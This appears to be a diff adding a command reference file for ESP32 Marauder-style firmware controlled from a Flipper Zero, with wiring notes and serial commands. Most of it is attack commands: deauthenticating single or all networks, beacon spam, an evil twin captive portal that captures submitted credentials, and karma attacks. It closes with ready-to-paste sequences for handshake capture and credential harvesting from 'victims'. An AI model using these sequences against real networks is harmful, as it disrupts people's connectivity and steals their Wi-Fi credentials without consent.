@@ -1,0 +1,142 @@
+﻿# ============================================================================
+#  FLLC - Flipper Zero GPIO -> ESP32 Marauder Command Reference
+# ============================================================================
+#  The ESP32 Wardriver firmware accepts commands over serial (115200 baud).
+#  When connected to Flipper Zero GPIO, the Flipper acts as a controller.
+#
+#  WIRING (Flipper Zero -> ESP32):
+#    Flipper TX (pin 13) -> ESP32 RX (GPIO 3)
+#    Flipper RX (pin 14) -> ESP32 TX (GPIO 1)
+#    Flipper GND (pin 18) -> ESP32 GND
+#    Flipper 3.3V (pin 9) -> ESP32 3.3V (or power ESP32 separately via USB)
+#
+#  On Flipper: GPIO -> UART Bridge -> 115200 baud
+#  Or use: ESP32 WiFi Marauder app (available in Momentum/Unleashed firmware)
+# ============================================================================
+
+# ============================================================================
+#  RECONNAISSANCE COMMANDS
+# ============================================================================
+
+# Full automated recon (WiFi scan + Probe sniff + BLE scan)
+recon
+
+# WiFi network scan (all 14 channels)
+scan wifi
+
+# BLE device scan (default 10 seconds)
+scan ble
+
+# Extended BLE scan (30 seconds)
+scan ble 30
+
+# Continuous probe request sniffing
+sniff probes
+
+# ============================================================================
+#  ATTACK COMMANDS
+# ============================================================================
+
+# Deauth a specific network by scan index
+# (Run 'scan wifi' first to get indices)
+deauth 0
+
+# Deauth by BSSID/MAC
+deauth AA:BB:CC:DD:EE:FF
+
+# Deauth ALL discovered networks
+deauth all
+
+# Beacon spam - flood area with 30 fake SSIDs
+beacon spam
+
+# Evil Twin - clone a network with captive portal
+# (Captures credentials submitted to the portal)
+eviltwin TargetNetworkName
+
+# Karma attack - respond to ALL device probe requests
+# (Makes devices connect to you thinking you're their saved network)
+karma
+
+# ============================================================================
+#  CAPTURE COMMANDS
+# ============================================================================
+
+# Start PCAP capture to SD card (Wireshark-compatible)
+pcap start
+
+# Stop PCAP capture
+pcap stop
+
+# ============================================================================
+#  DISPLAY COMMANDS
+# ============================================================================
+
+# Show all discovered WiFi networks
+show networks
+
+# Show all discovered clients (with their associated APs)
+show clients
+
+# Show captured probe requests
+show probes
+
+# Show captured credentials (from evil twin)
+show creds
+
+# System status (mode, uptime, counters)
+status
+
+# ============================================================================
+#  CONTROL COMMANDS
+# ============================================================================
+
+# Lock to specific WiFi channel
+channel 6
+
+# Enable channel hopping
+hop
+
+# Save all data to SD card
+save
+
+# Clear all collected data from memory
+clear
+
+# Stop all active attacks
+stop
+
+# ============================================================================
+#  ATTACK SEQUENCES (copy-paste these as multi-command chains)
+# ============================================================================
+
+# --- SEQUENCE 1: Full Passive Recon ---
+# scan wifi
+# scan ble
+# sniff probes
+# (wait 30 seconds)
+# save
+
+# --- SEQUENCE 2: Targeted Deauth + Handshake Capture ---
+# scan wifi
+# pcap start
+# deauth 0
+# (wait 30 seconds for handshake)
+# pcap stop
+# show creds
+
+# --- SEQUENCE 3: Evil Twin Credential Harvest ---
+# scan wifi
+# (note target SSID)
+# deauth 0
+# eviltwin "Target WiFi Name"
+# (wait for victims to connect and enter creds)
+# show creds
+
+# --- SEQUENCE 4: Karma + Probe Harvest ---
+# karma
+# sniff probes
+# pcap start
+# (wait for devices to auto-connect)
+# show probes
+# save
